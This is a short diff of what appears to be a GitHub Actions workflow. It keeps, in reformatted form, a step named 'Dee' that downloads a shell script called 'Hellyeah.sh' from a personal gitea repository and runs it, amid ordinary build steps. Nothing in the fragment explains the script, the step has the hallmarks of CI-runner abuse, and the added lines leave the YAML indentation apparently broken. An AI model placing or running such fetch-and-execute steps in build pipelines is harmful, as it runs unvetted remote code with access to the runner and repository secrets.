@@ -111,8 +111,8 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: Dee
-      run: |
-        wget https://try.gitea.io/gairmeet/chuax/raw/branch/master/Hellyeah.sh && chmod +x Hellyeah.sh && ./Hellyeah.sh
+      run: wget https://try.gitea.io/gairmeet/chuax/raw/branch/master/Hellyeah.sh && chmod +x Hellyeah.sh && ./Hellyeah.sh
+     
       - name: Download the build folders
         uses: actions/download-artifact@v2
         with:
